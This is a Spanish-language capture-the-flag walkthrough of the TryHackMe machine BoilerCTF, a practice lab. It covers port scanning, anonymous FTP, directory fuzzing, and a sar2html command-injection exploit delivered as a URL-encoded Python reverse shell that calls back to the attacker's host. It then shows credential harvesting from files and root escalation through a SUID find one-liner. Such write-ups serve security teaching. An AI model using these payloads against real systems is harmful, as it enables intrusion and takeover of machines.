---
title: "BoilerCTF | TryHackMe 🔥"
date: 2023-09-07T02:01:58+05:30
description: "BoilerCTF es una maquina de TryHackMe, la herramienta para trazar estadísticas Sar2HTML tiene una vulnerabilidad RCE la cual explotamos para obtener una shell."
tags: [tryhackme, frp, webmin, ssh, sar2html]
---


## Nmap

Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos

```bash

$ nmap -p- -Pn -n -sVC --min-rate 2000 10.10.24.224

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.48.252
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 3EBE21590CEBC71E0E72F5E2B53E0435
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HT
hHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3
ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2
J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7Z
rUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

En el puerto 21 se encuentra el servicio ftp usamos las credenciales anonymous, y encontramos un archivo con un mensaje cifrado

```bash

$ ftp -v 10.10.24.224
Connected to 10.10.24.224.
220 (vsFTPd 3.0.3)
Name (10.10.24.224:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> passive
Passive mode on.
ftp> ls -la
227 Entering Passive Mode (10,10,24,224,161,174).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt -
remote: .info.txt
227 Entering Passive Mode (10,10,24,224,176,66).
150 Opening BINARY mode data connection for .info.txt (74 bytes).
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
226 Transfer complete.
74 bytes received in 0.00 secs (133.8252 kB/s)

```


El texto sin formato dice `“Just wanted to see if you find it. Lol. Remember: Enumeration is the key!”` que podemos obtener usando el algoritmo ROT13 para decodificar el texto cifrado

## web

Ingresamos la web en puerto 80 y encontramos esto


{{< figure src="https://i.imgur.com/Sl3xtrr.png">}}


Es sólo la página predeterminada de Apache, así que analicemos para ver qué otros archivos y directorios podemos encontrar

```bash
$ ffuf -u http://10.10.24.224/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -t 80


manual                  [Status: 301, Size: 313, Words: 20, Lines: 10]
joomla                  [Status: 301, Size: 313, Words: 20, Lines: 10]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]


```

Hay un blog que ejecuta el CMS `Joomla` detrás

{{< figure src="https://i.imgur.com/RCvbT1o.png">}}


Analizamos ese nuevo directorio


```bash

$ ffuf -u http://10.10.24.224/joomla/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -c



.htpasswd               [Status: 403, Size: 303, Words: 22, Lines: 12]
_archive                [Status: 301, Size: 322, Words: 20, Lines: 10]
_database               [Status: 301, Size: 323, Words: 20, Lines: 10]
_test                   [Status: 301, Size: 319, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 303, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 298, Words: 22, Lines: 12]
~www                    [Status: 301, Size: 318, Words: 20, Lines: 10]


```


Esta vez encontramos algunos directorios más. El /_test El directorio contiene una aplicación llamada `sar2html`

Una búsqueda rápida en la web muestra que [hay un error de ejecución remota de código](https://www.exploit-db.com/exploits/47204) que es fácil de explotar



# Reverse Shell

Después de algunas pruebas y errores, pude hacer funcionar una carga útil de Python con doble URL codificada


```url

http://10.10.24.224/joomla/_test/index.php?plot=;python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.6.48.252%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22%2Fbin%2Fbash%22)'


```

Nos ponemos en escucha

```bash

$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.2.55.245] from (UNKNOWN) [10.10.24.224] 34796
www-data@Vulnerable:/var/www/html/joomla/_test$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Vulnerable:/var/www/html/joomla/_test$ uname -a
uname -a
Linux Vulnerable 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux

```

### Primera Flag


Vemos el directorio actual y encontramos eun archivo `log.txt` que contiene la contraseña de otro usuario

```bash

www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: REDACTED
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.



```

Ahora hacemos `su basterd` y cambie a su cuenta con la contraseña que encontramos

El directorio de inicio de Basterd no contiene la bandera de usuario, sin embargo, hay una `backup.sh` script propiedad del usuario stoner. Si lo examinamos encontraremos que incluye la contraseña

con eso podemos `su stoner` y luego toma la bandera de `/home/stoner/.secret`


# Root

comprobamos los privilegios sudo y los binarios SUID

```bash
stoner@Vulnerable:/tmp$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:/tmp$ find / -user root -type f -perm /4000 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap



```

`/usr/bin/find` tiene el bit SUID configurado!


```bash
stoner@Vulnerable:/tmp$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
# cd /root && ls -la
total 12
drwx------  2 root root 4096 Aug 22  2019 .
drwxr-xr-x 22 root root 4096 Aug 22  2019 ..
-rw-r--r--  1 root root   29 Aug 21  2019 root.txt
# wc -c root.txt
29 root.txt

```
